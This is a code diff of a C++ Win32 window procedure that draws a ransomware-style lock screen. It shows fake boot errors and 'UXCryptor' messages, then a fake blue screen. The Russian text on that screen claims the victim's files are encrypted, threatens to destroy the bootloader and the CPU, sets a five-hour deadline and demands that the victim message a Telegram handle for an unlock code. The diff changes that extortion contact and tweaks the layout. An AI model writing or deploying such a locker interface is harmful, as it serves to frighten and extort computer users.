@@ -83,43 +83,69 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         int cy = rect.bottom / 2;
         
         if (!is_bsod) {
-            // СЦЕНА 1
+            // --- СЦЕНА 1: ВАС ЗАМЕТИЛИ ---
             FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
-            RECT redRect = {0, rect.bottom / 4, rect.right, rect.bottom * 3 / 4};
-            HBRUSH redBrush = CreateSolidBrush(RGB(139, 0, 0));
-            FillRect(hdc, &redRect, redBrush);
-            DeleteObject(redBrush);
-            
             SetBkMode(hdc, TRANSPARENT);
+            
+            HFONT fontSmall = CreateFontW(18, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
+            SelectObject(hdc, fontSmall);
+            
+            SetTextColor(hdc, RGB(255, 0, 0));
+            const wchar_t* error_text = 
+                L"Booting Windows ...\n"
+                L"Boot error: 0x03527737\n"
+                L"Boot error: 0x0266712\n"
+                L"Boot error: 0x02897593\n"
+                L"Boot error: 0x01447812\n"
+                L"Boot error: 0x0150974\n"
+                L"Boot error: 0x03873700\n"
+                L"Boot error: 0x0700882\n"
+                L"Boot error: 0x03803618\n"
+                L"Memory section at address 0x0424* is locked!\n"
+                L"Service UXCryptor started.\n\n"
+                L"* windows blocked!";
+            
+            RECT errRect = {50, cy - 280, cx + 400, cy - 50};
+            DrawTextW(hdc, error_text, -1, &errRect, DT_LEFT | DT_WORDBREAK);
+            
+            // Глаз
+            HFONT fontEye = CreateFontW(70, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
+            SelectObject(hdc, fontEye);
             SetTextColor(hdc, RGB(255, 255, 255));
-            HFONT font = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, font);
+            RECT eyeRect = {cx - 100, cy - 50, cx + 100, cy + 50};
+            DrawTextW(hdc, L"\u25C9", -1, &eyeRect, DT_CENTER | DT_VCENTER);
             
-            const wchar_t* art1 = L"         .:::.         \n       .:::::::.       \n      :::::::::::      \n     :::::::::::::     \n    :::::::::::::::    \n   :::::::::::::::::   \n  :::::::::::::::::::  \n ::::::::::::::::::::: \n:::::::::::::::::::::::";
-            DrawTextW(hdc, art1, -1, &redRect, DT_CENTER | DT_VCENTER);
-            
-            DeleteObject(font);
+            // Текст "ВАС ЗАМЕТИЛИ"
+            HFONT fontLarge = CreateFontW(32, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
+            SelectObject(hdc, fontLarge);
+            RECT titleRect = {cx - 300, cy + 60, cx + 300, cy + 120};
+            DrawTextW(hdc, L"\u0412\u0410\u0421 \u0417\u0410\u041c\u0415\u0422\u0418\u041b\u0418", -1, &titleRect, DT_CENTER | DT_VCENTER);
+
+            DeleteObject(fontSmall);
+            DeleteObject(fontEye);
+            DeleteObject(fontLarge);
         } else {
-            // СЦЕНА 2 (BSOD)
+            // --- СЦЕНА 2: BSOD ---
             HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
             FillRect(hdc, &rect, blueBrush);
             DeleteObject(blueBrush);
             
             SetBkMode(hdc, TRANSPARENT);
-            HFONT font = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
+            // УВЕЛИЧИЛИ ШРИФТ С 16 ДО 20
+            HFONT font = CreateFontW(20, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, font);
 
-            // Верхняя плашка (По центру)
-            RECT whiteRect = {cx - 250, cy - 250, cx + 250, cy - 220};
+            // Верхняя плашка
+            RECT whiteRect = {cx - 300, cy - 300, cx + 300, cy - 260};
             HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &whiteRect, whiteBrush);
             DeleteObject(whiteBrush);
             SetTextColor(hdc, RGB(0, 0, 0));
             DrawTextW(hdc, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
             
-            // Основной текст (По центру)
+            // Основной текст
             SetTextColor(hdc, RGB(255, 255, 255));
-            RECT textRect = {cx - 350, cy - 200, cx + 350, cy + 50};
+            RECT textRect = {cx - 450, cy - 230, cx + 450, cy + 50};
             const wchar_t* bsod_text = 
                 L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
                 L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
@@ -129,12 +155,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                 L"\u0411\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0443 \u0433\u043b\u0430\u0432\u043d\u044b\u0439 \u0437\u0430\u0433\u0440\u0443\u0437\u0447\u0438\u043a \u043c\u0430\u0442\u0435\u0440\u0438\u043d\u043a\u0438 \u0431\u0443\u0434\u0435\u0442 \u0441\u043d\u0435\u0441\u0451\u043d, \u0431\u0443\u0434\u0435\u0442 \u043f\u043e\u0434\u0430\u043d\u0430\n"
                 L"\u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u0430\u044f \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043d\u0430 \u0432\u0430\u0448 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440, \u0447\u0442\u043e \u043f\u0440\u0438\u0432\u0435\u0434\u0435\u0442 \u043a \u0435\u0433\u043e \u043d\u0435\u0438\u0441\u043f\u0440\u0430\u0432\u043d\u043e\u0441\u0442\u0438.\n"
                 L"\u0423 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c 5 \u0447\u0430\u0441\u043e\u0432 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0447\u0442\u043e\u0431\u044b \u0432\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0434,\n"
-                L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @opka8       (Telegram)";
+                L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @Montanczikqa       (Telegram)";
             
             DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
             
-            // Поле ввода (По центру)
-            RECT inputRect = {cx - 350, cy + 80, cx + 350, cy + 110};
+            // Поле ввода
+            RECT inputRect = {cx - 400, cy + 100, cx + 400, cy + 140};
             HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &inputRect, inputBrush);
             DeleteObject(inputBrush);
@@ -143,7 +169,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
             DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-            // Имя ПК и Таймер (Слева внизу, но с отступом)
+            // Имя ПК и Таймер
             SetTextColor(hdc, RGB(255, 255, 255));
             RECT bottomRect = {50, rect.bottom - 100, 800, rect.bottom - 70};
             std::wstring bottom = L"Current PC: " + pc_name;
@@ -158,7 +184,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             RECT timerRect = {50, rect.bottom - 70, 800, rect.bottom - 40};
             DrawTextW(hdc, timer_buf, -1, &timerRect, DT_LEFT);
 
-            // Окно ошибки (По центру)
+            // Окно ошибки
             if (show_error) {
                 RECT errRect = {cx - 250, cy - 50, cx + 250, cy + 50};
                 HBRUSH redBrush = CreateSolidBrush(RGB(204, 0, 0));
